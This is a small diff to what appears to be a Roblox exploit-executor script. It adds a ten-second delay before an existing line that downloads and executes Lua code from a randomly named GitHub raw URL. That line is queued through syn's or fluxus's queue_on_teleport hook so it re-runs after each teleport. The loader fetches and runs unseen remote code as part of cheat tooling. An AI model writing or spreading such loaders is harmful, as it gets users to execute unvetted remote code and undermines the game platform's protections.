@@ -578,6 +578,7 @@ local queue_on_teleport = queue_on_teleport or syn.queue_on_teleport or fluxus.q
 
 if queue_on_teleport then
     queue_on_teleport([[ 
+	wait(10)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxi123/sdfsdgghfdADASFHGFDH/refs/heads/main/sdgimdisakGDHAGs.lua"))() 
     ]])
 else
